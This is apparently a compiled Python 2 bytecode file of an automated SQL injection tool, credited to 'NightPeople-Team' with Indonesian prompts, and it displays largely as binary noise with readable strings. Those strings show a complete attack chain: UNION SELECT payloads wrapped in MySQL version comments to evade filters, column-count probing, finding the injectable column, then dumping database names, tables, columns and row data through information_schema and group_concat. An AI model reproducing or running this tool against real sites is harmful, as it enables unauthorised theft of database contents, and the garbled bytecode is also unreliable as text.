ó
˛*]c           @   sY  d  d l  Z d  d l Z d  d l Z d  d l Z d  d l Z d Z e j   d k r] d Z n  e j e e   d Z	 e	 GHd d d     YZ
 d d d	     YZ d
 d d     YZ e
   Z e j   e j   e j   d e e j  GHe   Z e j   Z e j e  e j j e  x e j D] Z d e j GHq)Wg  Z e j e j d j  Z x: e j d  D]) Z e   Z e j e  e j e  qnWe j d j e  d e GHe j  j! d  e"   Z# e j$ e# e j d j  Z% e% j d  Z& e j d j d j e&  d e% GHe j  j! d  e"   j d  Z% e j' e% e# e  d S(   i˙˙˙˙Nt   cleart   Windowst   clssÓ   
  _________________  .____    .__ 
 /   _____/\_____  \ |    |   |__|
 \_____  \  /  / \  \|    |   |  |
 /        \/   \_/.  \    |___|  |
/_______  /\_____\ \_/_______ \__|
        \/        \__>       \/   
t   Sqlic           B   s   e  Z d Z d Z d Z g  Z d  Z d d g Z d Z	 d   Z
 d   Z d   Z d   Z d   Z d   Z d	   Z d
   Z d   Z d   Z d   Z RS(   s'   0x2d31+/*!50000union*/+/*!50000select*/t    t   1620597971540027c         C   s1  xq t  t j  D]` \ } } | d k r y; t j | d } | j d  } | | d  } | |  _ Wqp qp Xq q Wy d | GHd GHWn¤ t k
 r,Ht j d  d GHt j d  d GHt j d  d	 GHt j d  d
 GHt j d  d GHt j d  d GHt j d  d GHt j d  t   n Xd  S(   Ns   --urli   t   =s   Url: s   
s"   ----------------------------------gš?s   Coder : Tumans   Team : NightPeople-Teams%   Thanks To All Member NightPeople-Teams   *ERROR*: Url not defined!
sP   Contoh: python2 sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
(	   t	   enumeratet   syst   argvt   findt   urlt	   NameErrort   timet   sleept   exit(   t   selft   kt   vt   ut   posR   (    (    s   /sdcard/AS/sqli.pyt   setUrl   s<    		c         C   s   t  j |  } | j   S(   N(   t   toxict   urlopent   read(   R   R   t   res(    (    s   /sdcard/AS/sqli.pyt
   getContent?   s    c         C   sö   yÜ d GH|  j  |  j } d } d } xŤ t | |  D] } t j j d j |   | | k rx | | k rx | d 7} n  | |  j 7} |  j |  } | j	 d  d k r4 | j	 d  d k rÎ | |  _
 d  Sq4 q4 Wd	 |  _
 Wn d
 GHt   n Xd  S(   Ns   [+]Mencari Column Cok...[+]i   i2   s   Jumlah Column: {0}s   , s   union selecti˙˙˙˙R   i    s   
Error!(   R   t   payloadt   rangeR   t   stdoutt   writet   formatt   keyR   R
   t   columnsR   (   R   R   t   startt   finisht   iR   (    (    s   /sdcard/AS/sqli.pyt
   setColumnsC   s&    	c         C   s  xë t  d |  j d  D]Ó } |  j } x t  d |  j d  D]n } | d k ro | |  j d k ro | d } n  | | k r | d |  j d 7} q= | d t |  d 7} q= W|  j |  j |  } | j |  j  d k r | |  _ d  Sq Wd |  _ t	   d  S(   Ni   s   , s   /*!50000ConCat(0x27,s   ,0x27)*/i˙˙˙˙i    (
   R   R!   R   R    t   strR   R   R
   t   vulColR   (   R   R$   t   linet   jR   (    (    s   /sdcard/AS/sqli.pyt	   setVulColX   s    			c         C   s   d | d S(   Ns+   /*!50000Concat(0x5e27,/*!50000gROup_cONcat(s   )*/,0x275e)(    (   R   t   string(    (    s   /sdcard/AS/sqli.pyt	   getConcati   s    c         C   s_   | j  d  } | d k r[ | | d } | j  d  } | d k rL | |  Sd GHt   n  d  S(   Ns   ^'i˙˙˙˙i   s   '^s   *ERROR*: Not found!
(   R
   R   (   R   t   contentR   t   ini(    (    s   /sdcard/AS/sqli.pyt   getVarsl   s    c         C   s9  |  j  |  j d g |  _ d } d } xŮ t d |  j d  D]Á } | d k rj | |  j d k rj d } n  | d k rŕ | |  j k rľ |  j | c | t |  7<| t |  7} qý | d k r× |  j | c d 7<n  d } q< |  j | c | t |  7<q< W|  j d d |  j d } |  j |  } |  j |  S(   NR   i    i   t   ,s0   /*!50000Group_Concat(0x5e27,database(),0x275e)*/(	   R   R   t   buildR   R!   R'   R&   R   R/   (   R   R(   t   sideR$   R   R   (    (    s   /sdcard/AS/sqli.pyt   getDatabasew   s"    		!c         C   sE   |  j  d |  j d  |  j  d d } |  j |  } |  j |  S(   Ni    t
   table_namei   sd   ++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()--+(   R1   R,   R   R/   (   R   t   databaseR   R   (    (    s   /sdcard/AS/sqli.pyt	   getTables   s    )c         C   sj   d } t  |  d } d } xG | D]? } | t t |   7} | | k rX | d 7} n  | d 7} q# W| S(   NR   i   i    s   , (   t   lenR&   t   ord(   R   R+   t   chart   lastR$   R)   (    (    s   /sdcard/AS/sqli.pyt   charCode   s    c         C   sV   |  j  d |  j d  |  j  d d |  j |  d } |  j |  } |  j |  S(   Ni    t   column_namei   sW   ++from+/*!50000inforMAtion_schema*/.columns+ /*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(s   )--+(   R1   R,   R;   R   R/   (   R   t   tableR5   R   R   (    (    s   /sdcard/AS/sqli.pyt
   getColumns   s    :c         C   s  d } d } d } g  } x\ | D]T } | j  t |   | | d 7} | d k r_ | d 7} n  | | 7} | d 7} q W|  j d d | d |  j d d | d	 }	 |  j |	  }
 |  j |
  } y | j d
  } Wn d GHn Xg  } x | D] } d } | j d  } g  } xN | D]F } | j  |  t |  | | k rXt |  | | <n  | d } qW| j  |  qô W|  j d j d j |  d } d } xJ | D]B } | | 7} x/ t	 t |  | | d  D] } | d 7} qÓWqĽW| GHx | D] } d } | j d  } d } d } xT | D]L } | | 7} x/ t	 t |  | | d  D] } | d 7} qSW| d } q%W| GHq÷Wd  S(   NR   i    s   	s   ,0x3a,i   s+   /*!50000ConCAt(0x5e27,/*!50000gROup_cONcat(s   )*/,0x275e)s   +from+s   --+-R0   s   *ERROR*: Not found!
t   :i   t    (
   t   appendR7   R1   R   R/   t   splitt   dbst   tablest   setDatasR   (   R   t   colsR=   R5   R(   R$   t   titlet   spacet   nameR   R   t   datat   rowst   vectorR)   t   colt   tempR   t   l(    (    s   /sdcard/AS/sqli.pyt   getDataĄ   s`    
0	
$
$N(   t   __name__t
   __module__t   NoneR   R'   R!   RC   R   R1   R    R   R   R%   R*   R,   R/   R3   R6   R;   R>   RP   (    (    (    s   /sdcard/AS/sqli.pyR      s$   	!									t   Dbc           B   s&   e  Z d Z g  Z d    Z d   Z RS(   c         C   s   | |  _  d  S(   N(   RI   (   R   RI   (    (    s   /sdcard/AS/sqli.pyt   setNameÖ   s    c         C   s   | |  _  d  S(   N(   RD   (   R   R=   (    (    s   /sdcard/AS/sqli.pyt	   setTablesŘ   s    N(   RQ   RR   RS   RI   RD   RU   RV   (    (    (    s   /sdcard/AS/sqli.pyRT   Ó   s   	t   Tbc           B   s5   e  Z d Z g  Z g  Z d    Z d   Z d   Z RS(   c         C   s   | |  _  d  S(   N(   RI   (   R   RI   (    (    s   /sdcard/AS/sqli.pyRU   ß   s    c         C   s   | |  _  d  S(   N(   R!   (   R   R!   (    (    s   /sdcard/AS/sqli.pyR%   á   s    c         C   s   | |  _  d  S(   N(   RK   (   R   RK   (    (    s   /sdcard/AS/sqli.pyRE   ă   s    N(	   RQ   RR   RS   RI   R!   RK   RU   R%   RE   (    (    (    s   /sdcard/AS/sqli.pyRW   Ű   s   		s   
Vul Column: s
   Database: i    R0   s   Pilih Tables Cok: s   
Pilih Table Cok: s   Pilih Column Cok: s   
Pilih Column Cok: (    (    (    ((   t   urllibR   R   t   ost   platformR   R    t   systemR&   t   headerR   RT   RW   t   sR   R%   R*   R'   t   dbR3   R5   RU   RC   RA   R$   RI   t   tbsR6   RD   RB   t   tbRV   R   R   t	   raw_inputR=   R>   RF   R   RP   (    (    (    s   /sdcard/AS/sqli.pyt   <module>   sR   		˝	


					